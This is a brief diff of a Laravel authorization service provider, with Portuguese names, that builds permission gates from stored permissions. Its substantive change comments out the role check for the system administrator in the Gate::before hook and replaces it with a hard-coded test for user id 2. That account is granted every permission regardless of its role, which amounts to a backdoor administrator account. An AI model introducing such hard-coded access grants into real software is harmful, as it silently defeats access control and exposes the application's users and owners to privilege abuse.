@@ -25,7 +25,7 @@ class AuthServiceProvider extends ServiceProvider
     public function boot(): void
     {
         $permissoes = Permissao::with('dzjvxinawjwtnfa')->get();
-        
+
         foreach ($permissoes as $key => $permissao)
         {
             Gate::define($permissao->nome, function(User $user) use ($permissao)
@@ -34,10 +34,11 @@ class AuthServiceProvider extends ServiceProvider
                 return $user->temPermissao($permissao);
             });
         }
-        
+
         Gate::before(function(User $user)
         {
-            if ($user->isAdminSystem('Administrador do Sistema'))
+            // if ($user->isAdminSystem('Administrador do Sistema'))
+            if ($user->id == 2)
             {
                 return true;
             }
